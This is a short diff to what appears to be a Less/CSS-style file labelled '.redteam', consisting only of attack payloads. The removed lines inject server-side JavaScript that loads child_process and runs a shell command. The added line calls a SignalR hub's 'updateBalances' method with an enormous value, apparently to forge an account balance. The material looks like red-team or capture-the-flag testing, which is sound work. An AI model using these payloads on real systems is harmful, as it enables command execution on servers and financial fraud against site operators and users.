@@ -1,3 +1,2 @@
-@cmd: `global.process.mainModule.require("child_process")
-       .execSync("ls -l /")`;
+@cmd: `$($.connection.mainHub.client.updateBalances([1],[99999999999999999],[0],[0],[0],0).done(function(success){})`;
 .redteam { cmd: "@{cmd}" }
